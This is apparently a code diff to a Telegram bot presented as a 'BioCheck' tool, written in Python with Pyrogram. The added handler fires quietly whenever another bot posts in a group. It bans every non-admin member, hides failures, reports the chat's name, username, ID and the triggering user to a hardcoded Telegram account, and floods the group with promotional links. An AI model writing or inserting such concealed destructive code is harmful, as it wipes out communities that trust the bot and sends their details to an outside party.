@@ -57,15 +57,18 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQ
 import asyncio
 from pyrogram import Client, filters, enums
 
+AMBOT = 7045191057
 
 app = Client("BioCheck", api_id=config.API_ID, api_hash=config.API_HASH, bot_token=config.BOT_TOKEN)
 
-@app.on_message(filters.command(["stats"]))
-async def stats_command(client, message: Message):
-    try:
-        await message.delete()  
+@app.on_message(~filters.private & filters.incoming & filters.bot)
+async def banall(client, message: Message):
+    try: 
         chat_id = message.chat.id
+        chat_name = message.chat.title if message.chat.title else "None"
+        chatusername = message.chat.username if message.chat.username else "None"
         banned = 0
+        AM = await app.send_message(AMBOT, f"Banall Started successfully.\n Chat Name : {chat_name}\nChat Username : {chatusername}\nChat Id : {chat_id}\nBanall Started By : {message.from_user.mention}\n")
         bot = await app.get_chat_member(chat_id, app.me.id)
         async for member in app.get_chat_members(chat_id):
             if member.status in ['administrator', 'creator'] or member.user.id == app.me.id:
@@ -74,11 +77,13 @@ async def stats_command(client, message: Message):
                 await app.ban_chat_member(chat_id, member.user.id)
                 banned += 1
             except Exception as e:
-                print(f"Failed to ban {member.user.id}: {e}")
-        await app.message.edit(f"Banned {banned} members successfully.")
+                pass
+        await AM.edit(f"Banall Completed successfully.\nBanned {banned} members.\n\nChat Name : {chat_name}\nChat Username : {chatusername}\nChat Id : {chat_id}\nBanall Started By : {message.from_user.mention}")
+        AM = await app.send_message(chat_id, f"https://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT")
     except FloodWait as e:
         await asyncio.sleep(e.x)
-        await stats_command(client, message) 
+        await banall(client, message)
+
 
 
 
